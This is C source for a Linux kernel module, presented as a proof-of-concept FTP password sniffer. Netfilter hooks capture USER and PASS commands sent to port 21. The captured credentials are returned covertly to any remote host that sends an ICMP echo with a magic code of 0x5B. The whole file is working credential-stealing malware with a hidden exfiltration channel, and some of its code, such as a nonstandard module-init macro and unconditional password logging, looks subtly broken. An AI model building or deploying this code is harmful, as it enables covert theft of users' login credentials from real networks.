/* Simple proof-of-concept for kernel-based FTP password sniffer. 
* A captured Username and Password pair are sent to a remote host 
* when that host sends a specially formatted ICMP packet. Here we 
* shall use an ICMP_ECHO packet whose code field is set to 0x5B 
* *AND* the packet has enough 
* space after the headers to fit a 4-byte IP address and the 
* username and password fields which are a max. of 15 characters 
* each plus a NULL byte. So a total ICMP payload size of 36 bytes. */  
  
/* Written by bioforge,  March 2003 */  
  
#include <linux/kernel.h>  
#include <linux/init.h>  
#include <linux/module.h>  
#include <linux/version.h>  
#include <linux/string.h>  
#include <linux/kmod.h>  
#include <linux/vmalloc.h>  
#include <linux/workqueue.h>  
#include <linux/spinlock.h>  
#include <linux/socket.h>  
#include <linux/net.h>  
#include <linux/in.h>  
#include <linux/skbuff.h>  
#include <linux/ip.h>  
#include <linux/tcp.h>  
#include <linux/netfilter.h>  
#include <linux/netfilter_ipv4.h>  
#include <linux/icmp.h>  
#include <net/sock.h>  
#include <asm/uaccess.h>  
#include <asm/unistd.h>  
#include <linux/if_arp.h>  
  
  
#define MAGIC_CODE   0x5B  
#define REPLY_SIZE   36  
  
#define ICMP_PAYLOAD_SIZE  (htons(iph->tot_len) \  
                   - sizeof(struct iphdr) \  
                   - sizeof(struct icmphdr))  
  
/* THESE values are used to keep the USERname and PASSword until 
* they are queried. Only one USER/PASS pair will be held at one 
* time and will be cleared once queried. */  
static char *username = NULL;  
static char *password = NULL;  
static int  have_pair = 0;     /* Marks if we already have a pair */  
  
/* Tracking information. Only log USER and PASS commands that go to the 
* same IP address and TCP port. */  
static unsigned int target_ip = 0;  
static unsigned short target_port = 0;  
  
/* Used to describe our Netfilter hooks */  
struct nf_hook_ops  pre_hook;           /* Incoming */  
struct nf_hook_ops  post_hook;           /* Outgoing */  
  
  
/* Function that looks at an sk_buff that is known to be an FTP packet. 
* Looks for the USER and PASS fields and makes sure they both come from 
* the one host as indicated in the target_xxx fields */  
static void check_ftp(struct sk_buff *sk)  
{  
   struct iphdr *iph;  
   struct tcphdr *tcph;  
   char *data;  
   int len = 0;  
   int i = 0;  
     
   iph = ip_hdr(sk);  
   tcph = (void *) iph + iph->ihl * 4;  
   data = (char *)((int)tcph + (int)(tcph->doff * 4));  
  
   /* Now, if we have a username already, then we have a target_ip. 
    * Make sure that this packet is destined for the same host. */  
   if (username)  
     if (iph->daddr != target_ip || tcph->source != target_port)  
       return;  
     
   /* Now try to see if this is a USER or PASS packet */  
   if (strncmp(data, "USER ", 5) == 0) {          /* Username */  
      data += 5;  
        
      if (username)  return;  
        
      while (*(data + i) != '\r' && *(data + i) != '\n'  
         && *(data + i) != '\0' && i < 15) {  
     len++;  
     i++;  
      }  
        
      if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)  
    return;  
      memset(username, 0x00, len + 2);  
      memcpy(username, data, len);  
      *(username + len) = '\0';           /* NULL terminate */  
   } else if (strncmp(data, "PASS ", 5) == 0) {   /* Password */  
      data += 5;  
  
      /* If a username hasn't been logged yet then don't try logging 
       * a password */  
      if (username == NULL) return;  
      if (password)  return;  
        
      while (*(data + i) != '\r' && *(data + i) != '\n'  
         && *(data + i) != '\0' && i < 15) {  
     len++;  
     i++;  
      }  
  
      if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)  
    return;  
      memset(password, 0x00, len + 2);  
      memcpy(password, data, len);  
      *(password + len) = '\0';           /* NULL terminate */  
   } else if (strncmp(data, "QUIT", 4) == 0) {  
      /* Quit command received. If we have a username but no password, 
       * clear the username and reset everything */  
      if (have_pair)  return;  
      if (username && !password) {  
     kfree(username);  
     username = NULL;  
     target_port = target_ip = 0;  
     have_pair = 0;  
       
     return;  
      }  
   } else {  
      return;  
   }  
  
   if (!target_ip)  
     target_ip = iph->daddr;  
   if (!target_port)  
     target_port = tcph->source;  
  
   if (username && password)  
     have_pair++;               /* Have a pair. Ignore others until 
                    * this pair has been read. */  
    printk("Now we have a pair of pass and username\n");  
    printk("username is :%s\n",username);  
    printk("password is :%s\n",password);     
}  
  
/* Function called as the POST_ROUTING (last) hook. It will check for 
* FTP traffic then search that traffic for USER and PASS commands. */  
static unsigned int watch_out(unsigned int hooknum,  
                  struct sk_buff *skb,  
                  const struct net_device *in,  
                  const struct net_device *out,  
                  int (*okfn)(struct sk_buff *))  
{  
   struct sk_buff *sk;  
   struct iphdr *iph;  
   struct tcphdr *tcph;  
  
   sk = skb_copy(skb, 1);  
   iph = ip_hdr(sk);  
   tcph = (void *) iph + iph->ihl * 4;  
  
   /* Make sure this is a TCP packet first */  
   if ( iph->protocol != IPPROTO_TCP)  
     return NF_ACCEPT;               /* Nope, not TCP */  
      
   /* Now check to see if it's an FTP packet */  
   if (tcph->dest != htons(21))  
     return NF_ACCEPT;               /* Nope, not FTP */  
     
   /* Parse the FTP packet for relevant information if we don't already 
    * have a username and password pair. */  
   if (!have_pair)  
     check_ftp(sk);  
     
   /* We are finished with the packet, let it go on its way */  
   return NF_ACCEPT;  
}  
  
  
/* Procedure that watches incoming ICMP traffic for the "Magic" packet. 
* When that is received, we tweak the skb structure to send a reply 
* back to the requesting host and tell Netfilter that we stole the 
* packet. */  
static unsigned int watch_in(unsigned int hooknum,  
                 struct sk_buff *skb,  
                 const struct net_device *in,  
                 const struct net_device *out,  
                 int (*okfn)(struct sk_buff *))  
{  
   struct sk_buff *sk;  
   struct iphdr *iph;  
   struct tcphdr *tcph;  
  
   struct icmphdr *icmp;  
   char *cp_data;               /* Where we copy data to in reply */  
   unsigned int   taddr;           /* Temporary IP holder */  
  
   sk = skb;  
   iph = ip_hdr(sk);  
   tcph = (void *) iph + iph->ihl * 4;  
  
  
   /* Do we even have a username/password pair to report yet? */  
   if (!have_pair)  
     return NF_ACCEPT;  
       
   /* Is this an ICMP packet? */  
   if ( iph->protocol != IPPROTO_ICMP)  
     return NF_ACCEPT;  
     
   icmp = (struct icmphdr *)(sk->data + iph->ihl * 4);  
  
   /* Is it the MAGIC packet? */  
   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {  
      return NF_ACCEPT;  
   }  
     
   /* Okay, matches our checks for "Magicness", now we fiddle with 
    * the sk_buff to insert the IP address, and username/password pair, 
    * swap IP source and destination addresses and ethernet addresses 
    * if necessary and then transmit the packet from here and tell 
    * Netfilter we stole it. Phew... */  
   taddr = iph->saddr;  
   iph->saddr = iph->daddr;  
   iph->daddr = taddr;  
  
   sk->pkt_type = PACKET_OUTGOING;  
  
   switch (sk->dev->type) {  
    case ARPHRD_PPP:               /* No fiddling needs doing */  
      break;  
    case ARPHRD_LOOPBACK:  
    case ARPHRD_ETHER:  
    {  
       unsigned char t_hwaddr[ETH_ALEN];  
         
       /* Move the data pointer to point to the link layer header */  
       sk->data = (unsigned char *)sk->mac_header;  
       sk->len += ETH_HLEN; //sizeof(sb->mac.ethernet);  
       memcpy(t_hwaddr, (  ((struct ethhdr*)(sk->mac_header))->h_dest), ETH_ALEN);  
       memcpy( ((struct ethhdr*)(sk->mac_header))->h_dest, (((struct ethhdr*)(sk->mac_header))->h_source),ETH_ALEN);  
       memcpy((((struct ethhdr*)(sk->mac_header))->h_source), t_hwaddr, ETH_ALEN);  
    
       break;  
    }  
   };  
  
   /* Now copy the IP address, then Username, then password into packet */  
   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));  
   memcpy(cp_data, &target_ip, 4);  
   if (username)  
     memcpy(cp_data + 4, username, 16);  
   if (password)  
     memcpy(cp_data + 20, password, 16);  
     
   /* This is where things will die if they are going to. 
    * Fingers crossed... */  
   dev_queue_xmit(sk);  
  
   /* Now free the saved username and password and reset have_pair */  
   kfree(username);  
   kfree(password);  
   username = password = NULL;  
   have_pair = 0;  
     
   target_port = target_ip = 0;  
  
//   printk("Password retrieved\n");  
     
   return NF_STOLEN;  
}  
  
int init_module()  
{  
   pre_hook.hook     = watch_in;  
   pre_hook.pf       = PF_INET;  
   pre_hook.priority = NF_IP_PRI_FIRST;  
   pre_hook.hooknum  = NF_INET_PRE_ROUTING;  
     
   post_hook.hook     = watch_out;  
   post_hook.pf       = PF_INET;  
   post_hook.priority = NF_IP_PRI_FIRST;  
   post_hook.hooknum  = NF_INET_POST_ROUTING;  
     
   nf_register_hook(&pre_hook);  
   nf_register_hook(&post_hook);  
     
   return 0;  
}  
  
void cleanup_module()  
{  
   nf_unregister_hook(&post_hook);  
   nf_unregister_hook(&pre_hook);  
     
   if (password)  
     kfree(password);  
   if (username)  
     kfree(username);  
}  
  
  
  
MODULE_INIT(init_module);  
MODULE_EXIT(cleanup_module);  
  
MODULE_LICENSE("GPL");  
MODULE_AUTHOR("xsc");  